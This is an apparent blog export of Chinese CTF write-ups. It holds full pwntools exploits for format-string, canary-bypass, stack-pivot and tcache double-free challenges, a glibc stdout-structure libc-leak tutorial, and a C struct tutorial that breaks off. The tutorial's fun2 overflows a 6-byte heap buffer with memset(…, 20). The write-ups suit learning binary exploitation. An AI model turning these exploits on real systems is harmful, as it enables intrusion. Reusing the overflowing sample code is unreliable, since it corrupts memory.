[{"title":"FZNCTF-Langx-PWN-WP","url":"/2025/11/16/FZNCTF-PWN-WP/","content":"FZNCTF-Langx-PWN-WPfmt\n格式化字符串漏洞\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  int fd; // [rsp+4h] [rbp-24Ch]  char buf[48]; // [rsp+10h] [rbp-240h] BYREF  char format[520]; // [rsp+40h] [rbp-210h] BYREF  unsigned __int64 v7; // [rsp+248h] [rbp-8h]  v7 = __readfsqword(0x28u);  init_func(argc, argv, envp);  puts(&quot;Welcome to FZNCTF!&quot;);  puts(&quot;lizimi is waiting for you...&quot;);  puts(&quot;what do you want to say to him?&quot;);  puts(&quot;please input:&quot;);  fd = open(&quot;flag&quot;, 0);  if ( fd == -1 )  &#123;    perror(&quot;open flag failed&quot;);    exit(1);  &#125;  read(fd, buf, 0x30uLL);  close(fd);  read(0, format, 0x200uLL);  printf(format);  return 0;&#125;\n\n程序首先会打开flag文件并读到栈上，本地调试可知偏移为7(64位格式化字符串)\nexp:\nfrom pwn import *#p = process(&quot;./attachment&quot;)p = remote(&quot;nc1.ctfplus.cn&quot;,11882)context.log_level = &#x27;debug&#x27;#gdb.attach(p)p.recvuntil(&quot;please input:&quot;)p1 = b&#x27;%7$s&#x27;p.sendline(p1)p.interactive()\n\nbird\n开了金丝雀(canary)\n\n分析关键函数\nunsigned int vuln()&#123;  int i; // [esp+4h] [ebp-74h]  char buf[100]; // [esp+8h] [ebp-70h] BYREF  unsigned int v3; // [esp+6Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  puts(&quot;What a cute canary!!!!!&quot;);  puts(&quot;Maybe the canary is a string of numbers?&quot;);  puts(&quot;Can you guess the number?&quot;);  for ( i = 0; i &lt;= 1; ++i )  &#123;    read(0, buf, 0x200u);    printf(&quot;number %s&quot;, buf);    if ( !strncmp(buf, &quot;114514&quot;, 6u) ) //ctf经典数字      Right(); //没有什么用  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\nprintf(&quot;number %s&quot;, buf);这一步我们可以泄露canary\n泄露canary直接返回到后门getshell\nexp:\nfrom pwn import*#p = process(&quot;./canary&quot;)p = remote(&quot;nc1.ctfplus.cn&quot;,27529)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)def bug():\tgdb.attach(p)\tpause()\t\tdef exp():\tpc(&quot;Can you guess the number?&quot;)\toffest = 0x70 -0xc\tp0 = b&#x27;a&#x27;*offest\t#bug()\tpsl(p0)#sendline多发送一个0xa--&gt;&#x27;\\n&#x27;\tshell = 0x8049285\tp.recvuntil(b&#x27;a&#x27;*offest)\tcanary = u32(p.recv(4)) -0xa #所以这里直接减去0xa即可，因为canary最后一个字节也是00所以不用管\t\tpsl(b&#x27;a&#x27;*offest + p32(canary)+b&#x27;a&#x27;*0xC+p32(shell)) #getshell\tp.interactive()\texp()\t\t\t\n\nstack_pivotingx64\nssize_t vuln()&#123;  char buf[48]; // [rsp+0h] [rbp-30h] BYREF  puts(&quot;now let&#x27;s start to play!\\n&quot;);  puts(&quot;please give me your name\\n&quot;);  read(0, buf, 0x50uLL);  printf(&quot;your name is %s\\n&quot;, buf);  puts(&quot;give me some other message\\n&quot;);  return read(0, buf, 0x50uLL);&#125;\n\n程序存在栈溢出，但溢出长度不够，直接打栈迁移\nprintf(&quot;your name is %s\\n&quot;, buf);\n\n这一步泄露rbp地址，然后提前在栈中布置我们的rop链，存在堆栈不平衡加个ret,后面直接栈迁移\nexp:\nfrom pwn import*a=input(&quot;yes is process ,no is remote:&quot;)if &quot;y&quot; in a:\tp = process(&quot;./stack_pivotingx64&quot;)elif &quot;n&quot; in a:\tp =remote(&quot;nc1.ctfplus.cn&quot;,19747)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)def bug():\tgdb.attach(p)\tpause()\tdef exp():\trdi=0x0000000000401275\tsystem = 0x40126a\tmagic = 0x401256\tpc(&quot;please give me your name\\n&quot;)\t\tp0 = b&#x27;a&#x27;*0x30\tps(p0)\tpc(b&#x27;a&#x27;*0x30)\trbp = u64(p.recv(6)[-6::].ljust(8,b&#x27;\\x00&#x27;))-0x10\trsp = rbp-0x30\tbinsh =rsp+32\tph(rbp)\t#bug()\tp1=p64(0)+p64(rdi)+p64(binsh)+p64(system)+b&#x27;/bin/sh\\x00&#x27;+p64(magic+1)+p64(rsp)+p64(magic) #magic+1为ret\tpc(&quot;give me some other message\\n&quot;)\tps(p1)\tp.interactive()exp()\t\n\nezuaf\n保护全开\n\n存在uaf，不存在栈溢出\nint del()&#123;  int v0; // eax  void *v1; // rdi  puts(&quot;idx?&quot;);  v0 = get_int();  if ( v0 &lt; 0 )    return puts(&quot;invalid&quot;);  if ( num &lt;= v0 )    return puts(&quot;invalid&quot;);  v1 = (void *)heap[v0];  if ( !v1 )    return puts(&quot;invalid&quot;);  free(v1);//指针未置零  return puts(&quot;delete done&quot;);&#125;\n\nint show()&#123;  int v0; // eax  __int64 v1; // rbx  puts(&quot;idx?&quot;);  v0 = get_int();  if ( v0 &lt; 0 )    return puts(&quot;invalid&quot;);  if ( num &lt;= v0 )    return puts(&quot;invalid&quot;);  v1 = v0;  if ( !heap[v0] )    return puts(&quot;invalid&quot;);  write(1, &quot;content: &quot;, 9uLL);  write(1, (const void *)heap[v1], sizes[v1]);  return write(1, &quot;\\n&quot;, 1uLL);&#125;\n\n思路：先释放0x400的chunk挂进unsortedbin,通过uaf+show计算出libc基地址，打tcache_double_free，将malloc_hook填为one_gadget,用realloc来调节栈帧getshell\nexp:\nfrom pwn import*a=input(&quot;yes is process ,no is remote:&quot;)if &quot;y&quot; in a:\tp = process(&quot;./pwn&quot;)elif &quot;n&quot; in a:\tp =remote(&quot;nc1.ctfplus.cn&quot;,31004)e = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)uu64 = lambda  : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))def bug():\tgdb.attach(p)\tpause()def cmd(choice):\tpc(&quot;5. exit&quot;)\tpsl(str(choice))def add(size,content):\tcmd(1)\tpc(&quot;size?&quot;)\tpsl(str(size))\tpc(&quot;content:&quot;)\tpsl(content)\tdef delete(idx):\tcmd(2)\tpc(&quot;idx?&quot;)\tpsl(str(idx))def show(idx):\tcmd(3)\tpc(&quot;idx?&quot;)\tpsl(str(idx))\t\tdef edit(idx,content):\tcmd(4)\tpc(&quot;idx?&quot;)\tpsl(str(idx))\tpc(&quot;content:&quot;)\tps(content)\t\t\t\tdef exp(i):\tadd(0x410,b&#x27;jian&#x27;)#0\tadd(0x410,b&#x27;1angx&#x27;)#1\tdelete(0)\tshow(0)\tmalloc_hook = uu64()-0X70\tbase = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]\trealloc = base  + libc.sym[&#x27;realloc&#x27;]\trealloc_hook = malloc_hook -0x8\togg_offest = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]\togg = base +ogg_offest[0]\tph(base)\tadd(0x40,b&#x27;1angx&#x27;)#2\tdelete(2)\tp1= b&#x27;a&#x27;*8+p64(0x114514)\tedit(2,p1)\tdelete(2)\tedit(2,p64(realloc_hook))\tadd(0x40,b&#x27;1angx&#x27;)\t#bug()\tadd(0x40,p64(ogg)+p64(realloc+i))\tcmd(1)\tpc(&quot;size?&quot;)\tpsl(str(0x10))\tp.interactive()\t\texp(2)\t\n\n","categories":["PWN"],"tags":["WP"]},{"title":"IO_FILE利用之利用_IO_2_1_stdout泄露libc","url":"/2025/11/16/IO_FILE%E5%88%A9%E7%94%A8%E4%B9%8B%E5%88%A9%E7%94%A8_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc/","content":"IO_FILE利用之利用_IO_2_1_stdout泄露libcFILE结构FILE在linux系统的标准IO库使用来描述文件结构，称之为文件流。这里提及的”流“其实是一种抽象的概念，无论是硬件还是软件其实都没有”流“一说，只是人们为了便于描述数据的流向而创造的名称。比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流“\nFILE结构在程序执行fopen函数时会自动进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值\nFILE结构定义在libio.h:\nstruct _IO_FILE &#123;  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;struct _IO_FILE_complete&#123;  struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;# else  void *__pad1;  void *__pad2;  void *__pad3;  void *__pad4;  size_t __pad5;  int _mode;  /* Make sure we don&#x27;t get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;;\n\n一个进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表的头部用全局变量 _IO_list_all表示，通过这个值我们能遍历所有的FILE结构。\n如图：\n\n在标准I&#x2F;O库中，每个程序启动时stdin、stdout、stderr这三个文件流会自动打开。因此在初始状态下，_IO_list_all指向了一个由这些文件流构成的链表，但是这三个文件流是位于libc.so的数据段上，而我们使用fopen创建的文件流是分配在堆内存上的\n_IO_FILE_plus结构\n在FILE结构外还包裹了另一种结构_IO_FILE_plus,其中包含了一个重要的指针vtable(虚表)指向了一系列函数指针：\nstruct _IO_FILE_plus&#123;  FILE file;  const struct _IO_jump_t *vtable;&#125;;\n\n\n虚函数表是一个存储在内存中的表格，其中包含了类中所有虚函数的指针，每个类都有自己的虚函数表。当调用虚函数时，编译器通过虚函数表来确定应该调用哪个函数的实现。\n\n这里可以看见vtable是IO_jump_t 类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针。也就是说，如果使用_IO_FILE_plus去定义一个结构体指针的话，我们既可以使用IO_FILE中的结构体成员变量，也能使用IO_jump_t中的函数指针\nstruct _IO_jump_t&#123;    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);&#125;;\n\n_flags规则\n_flag是IO_FILE结构体中的第一个成员变量，这个成员变量在利用 _IO_2_1_stdout泄露libc的时候起了很重要的作用。\n_flag规则： _flag的高两位字节是由libc固定的，不同的libc可能存在差异，但是基本上都是0xfbad0000\n高两位字节的作用是作为一个标识，标志这是一个什么文件。而低两位的位数决定了程序的执行状态，低两位规则如下：\n#define _IO_MAGIC       0xFBAD0000  // 文件流结构体的魔数#define _OLD_STDIO_MAGIC 0xFABC0000 // 旧版 stdio 的魔数（兼容用）#define _IO_MAGIC_MASK  0xFFFF0000  // 魔数掩码（提取高 16 位）#define _IO_USER_BUF   1   // 用户自定义缓冲区（关闭时不释放）#define _IO_UNBUFFERED 2   // 无缓冲模式（直接操作文件描述符）#define _IO_NO_READS   4   // 禁止读操作（只写模式）#define _IO_NO_WRITES  8   // 禁止写操作（只读模式）#define _IO_EOF_SEEN   0x10  // 已检测到文件结束符（EOF）#define _IO_ERR_SEEN   0x20  // 发生 I/O 错误（如磁盘故障）#define _IO_BAD_SEEN   0x4000 // 流处于不可恢复的错误状态#define _IO_DELETE_DONT_CLOSE 0x40  // 关闭时不调用 close(_fileno)#define _IO_LINKED            0x80  // 与其他流链接（共享缓冲区）#define _IO_IN_BACKUP         0x100 // 正在备份数据（如内存映射回写）#define _IO_LINE_BUF          0x200 // 行缓冲模式（遇到 &#x27;\\n&#x27; 刷新）#define _IO_TIED_PUT_GET      0x400 // 读写指针逻辑绑定（如 fgetpos/fsetpos）#define _IO_CURRENTLY_PUTTING 0x800 // 当前处于写操作中#define _IO_IS_APPENDING      0x1000 // 追加模式（文件打开时指针在末尾）#define _IO_IS_FILEBUF        0x2000 // 文件缓冲区（非终端或管道）#define _IO_USER_LOCK 0x8000  // 用户自定义锁（控制并发访问）\n\n在执行流程中一般会将_flag和定义常量进行按位与运算，并根据与运算的结构进行判断如何执行。\nputs()函数执行流程\n_IO_puts –&gt; _IO_new_file_xsputn\nputs()函数在源码中的表现形式为_IO_puts:\nint_IO_puts (const char *str)&#123;  int result = EOF;              // 初始化返回值为 EOF（表示失败）  size_t len = strlen (str);     // 计算字符串长度（不含 &#x27;\\0&#x27;）  _IO_acquire_lock (stdout);     // 获取 stdout 的锁（防止并发写入）  // 检查流的虚表偏移和宽字符模式是否合法  if ((_IO_vtable_offset (stdout) != 0       || _IO_fwide (stdout, -1) == -1)  // 确保流处于字节模式（非宽字符）      &amp;&amp; _IO_sputn (stdout, str, len) == len  // 将字符串写入缓冲区      &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, stdout) != EOF)  // 写入换行符    result = MIN (INT_MAX, len + 1);  // 成功时返回写入字符数（含 &#x27;\\n&#x27;）  _IO_release_lock (stdout);       // 释放锁  return result;                   // 返回结果&#125;\n\n这里可以看到_IO_puts在过程当中调用了一个叫做_IO_sputn函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个宏，它的作用就是调用_IO_2_1_stdout_中的vtable所指向的_xsputn，也就是_IO_new_file_xsputn函数\n_IO_new_file_xsputn –&gt; _IO_OVERFLOW\nsize_t_IO_new_file_xsputn (FILE *f, const void *data, size_t n)&#123;  const char *s = (const char *) data;  size_t to_do = n;  int must_flush = 0;  size_t count = 0;  if (n &lt;= 0)    return 0;  /* This is an optimized implementation.     If the amount to be written straddles a block boundary     (or the filebuf is unbuffered), use sys_write directly. */  /* First figure out how much space is available in the buffer. */  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;      if (count &gt;= n)\t&#123;\t  const char *p;\t  for (p = s + n; p &gt; s; )\t    &#123;\t      if (*--p == &#x27;\\n&#x27;)\t\t&#123;\t\t  count = p - s + 1;\t\t  must_flush = 1;\t\t  break;\t\t&#125;\t    &#125;\t&#125;    &#125;  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */  /* Then fill the buffer. */  if (count &gt; 0)    &#123;      if (count &gt; to_do)\tcount = to_do;      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);      s += count;      to_do -= count;    &#125;  if (to_do + must_flush &gt; 0)    &#123;      size_t block_size, do_write;      /* Next flush the (full) buffer. */      if (_IO_OVERFLOW (f, EOF) == EOF)\t/* If nothing else has to be written we must not signal the\t   caller that everything has been written.  */\treturn to_do == 0 ? EOF : n - to_do;      /* Try to maintain alignment: write a whole number of blocks.  */      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;      do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);      if (do_write)\t&#123;\t  count = new_do_write (f, s, do_write);\t  to_do -= count;\t  if (count &lt; do_write)\t    return n - to_do;\t&#125;      /* Now write out the remainder.  Normally, this will fit in the\t buffer, but it&#x27;s somewhat messier for line-buffered files,\t so we let _IO_default_xsputn handle the general case. */      if (to_do)\tto_do -= _IO_default_xsputn (f, s+do_write, to_do);    &#125;  return n - to_do;&#125;\n\n首先进入函数之后判断输出缓冲区还有多少空间，这里是由_IO_write_end - _IO_write_base得来的，这两个是FILE结构体中的两个成员变量，分别是输出结束地址和真实输出地址\n关键代码：\n1335    if (__IO_OVERFLOW (f, EOF) == EOF)1336      /* If nothing else has to be written we must not signal the 1337         caller that everything has been written. */1338      return to_do == 0 ? EOF : n - to_do;\n\n经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过_IO_OVERFLOW函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为__overflow\n_IO_new_file_overflow –&gt; _IO_do_write\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\n上述代码关键在于 _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) ，我们需要成功执行 _ IO _ do_write()函数，这个函数作用是调用write输出输出缓冲区，传入的参数分别为：stdout结构体、_IO_write_base（输出缓冲区起始地址）和size（_IO_write_end - _IO_write_base计算得来）\n这时，我们可以事先在stdout的_IO_write_base的位置部署要输出的起始地址，那么再去利用_IO_do_write函数，即可打印部分内存地址，打印出来的内容就包含我们所需要泄露的libc\n为了执行_ IO _ do_write()函数，我们得绕过前面的检查\n首先：\nif (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */   &#123;     f-&gt;_flags |= _IO_ERR_SEEN;     __set_errno (EBADF);     return EOF;   &#125;\n\n这里判断_flags的标志位是否包含 _IO_NO_WRITES，\n#define _IO_MAGIC 0xFBAD0000 /* 魔数 */#define _IO_NO_WRITES  8   // 禁止写操作（只读模式）\n\n为了通过这个检查，我们得将此处的运算计算为假，所以我们只需要将_flag设置为0xfbad0000即可\n\n _flag&#x3D;0xFBAD0000  –&gt;  11111011101011010000000000000000  (第三位为0即可)\n_IO_NO_WRITES &#x3D; 8 –&gt; 00000000000000000000000000001000\n\n第二个大检查：\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;...&#125;\n\n由于_IO_write_base我们会先覆盖地址，所以 f-&gt;_IO_write_base == NULL必定为假，接下来我们令(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 为假即可,设置_flags &#x3D; 0xfbad0800\n#define _IO_MAGIC 0xFBAD0000#define _IO_CURRENTLY_PUTTING 0x800f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1_flags = 0xfbad0800\n\n第三个检查：\nif (ch == EOF)  return _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n由于前面传进来的参数就是EOF所以不用管\nif (__IO_OVERFLOW (f, EOF) == EOF)\n\n绕过了这些检查后\n我们就成功进入了_IO_do_write() 函数\n_IO_new_do_write –&gt; new_do_write\nint_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123;  return (to_do == 0\t  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;\n\n我们进入_IO_do_write() 函数之后就会进入 _IO_new_do_write函数，该函数只是调用了new_do_write函数，参数分别为stdout结构体，输出缓冲区起始地址，输出长度\n跟进new_do_write函数\nnew_do_write –&gt; _IO_SYSWRITE\nstatic size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123;  size_t count;  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\t\t       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\t\t       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\n关键代码：count = _IO_SYSWRITE (fp, data, to_do);首先明确目标是进入这个函数，该函数会执行系统调用write。\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n\n接下来就是考虑这两个判断语句了我们进入第一个if语句的话可以执行count = _IO_SYSWRITE (fp, data, to_do);,所以我们就不需要满足else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)的条件了（这个条件比较难满足）\n所以我们将_flags设置为0xfbad1000即可\n#define _IO_MAGIC 0xFBAD0000#define _IO_IS_APPENDING 0x1000fp-&gt;_flags &amp; _IO_IS_APPENDING = 1_flags = 0xfbad1000\n\n接下来就可以执行 _IO_SYSWRITE (fp, data, to_do)函数打印出我们一开始设置的要输出的起始地址，从而达到泄露libc的目的了\n总结：\n我们得满足以下条件来执行_IO_SYSWRITE (fp, data, to_do)：\n\n_flags &amp; _IO_NO_WRITES = 0_flags &amp; _IO_CURRENTLY_PUTTING = 1_flags &amp; _IO_IS_APPENDING = 1_flags = 0xFBAD1800\n\n设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，stdout结构中自带地址也足够泄露libc)\n\n\n\n参考blog：https://hollk.blog.csdn.net/article/details/113845320\n\n","categories":["PWN"],"tags":["pwn_IO"]},{"title":"C中结构体之指针与数组杂谈","url":"/2025/11/16/C%E4%B8%AD%E7%BB%93%E6%9E%84%E4%BD%93%E4%B9%8B%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/","content":"C中结构体之指针与数组#include &lt;iostream&gt;#include &lt;conio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;using namespace std;// 今天描述结构体中的指针和数组typedef struct _Player&#123;    int level;    char name[20];&#125; Player, *PPplayer;// 上面这个第一个结构体里面成员在内存中是连续的void fun1()&#123;    PPplayer p1 = (PPplayer)malloc(sizeof(Player)); // 为p1申请内存    memset(p1, 0, sizeof(Player));                  // 初始化    p1-&gt;level = 1;    strcpy(p1-&gt;name, &quot;张三&quot;);    cout &lt;&lt; &quot;p1-&gt;level:&quot; &lt;&lt; p1-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p1-&gt;name:&quot; &lt;&lt; p1-&gt;name &lt;&lt; endl;    free(p1);    p1 = NULL;&#125;typedef struct _Player2&#123;    int level;    char *name; // name是一个指针&#125; Player2, *PPplayer2;// 上面这个结构体里面成员在内存中是不连续的void fun2()&#123;    PPplayer2 p2 = (PPplayer2)malloc(sizeof(Player2)); // 为p2申请内存    memset(p2, 0, sizeof(Player2));                    // 初始化    p2-&gt;level = 1;    p2-&gt;name = (char *)malloc(strlen(&quot;1angx&quot;) + 1); // 为name申请内存,这里用了strlen()函数，最后的\\x00的大小没有加上去，所以要加个1    memset(p2-&gt;name, 0, 20);                        // 初始化    strcpy(p2-&gt;name, &quot;1angx&quot;);    cout &lt;&lt; &quot;p2-&gt;level:&quot; &lt;&lt; p2-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p2-&gt;name:&quot; &lt;&lt; p2-&gt;name &lt;&lt; endl;    // free(p2-&gt;name);    free(p2);    p2 = NULL;&#125;typedef struct _Player3&#123;    int level;    char name[1]; // 这里给name的大小为1个字节，我们等会会在fun3函数中说明为何&#125; Player3, *PPplayer3;void fun3()&#123;    PPplayer3 p3 = (PPplayer3)malloc(sizeof(Player3) + strlen(&quot;1angx&quot;)); // 为p3申请内存，同时加上我们的name的大小，这里因为我们数组的大小是1所以不需要再加上1了    memset(p3, 0, sizeof(Player3) + strlen(&quot;1angx&quot;));                    // 初始化    p3-&gt;level = 1;    strcpy(p3-&gt;name, &quot;1angx&quot;); // 这里我们直接给name赋值是不是越界访问了，确实是，但是由于在结构体中内存是连续的，name在结构体中，我们的结构体的大小足够大，且level name的内存是连续的    cout &lt;&lt; &quot;p3-&gt;level:&quot; &lt;&lt; p3-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p3-&gt;name:&quot; &lt;&lt; p3-&gt;name &lt;&lt; endl;    free(p3);    p3 = NULL;    puts(&quot;fun3中，我们就实现了内存连续，且大小为动态的name&quot;);    puts(&quot;我们通过‘越界访问’实现了这一要求&quot;);&#125;int main()&#123;    fun1(); // fun1中确实是利用数组实现了角色名称的创建，但是大小是固定的，不能动态改变    putchar(&#x27;\\n&#x27;);    fun2(); // fun2中利用指针实现了角色名称的创建，大小是动态的，但是内存是不连续的    putchar(&#x27;\\n&#x27;);    puts(&quot;那我们怎么实现大小是动态的，其在内存空间中的大小也是动态的？\\n&quot;);    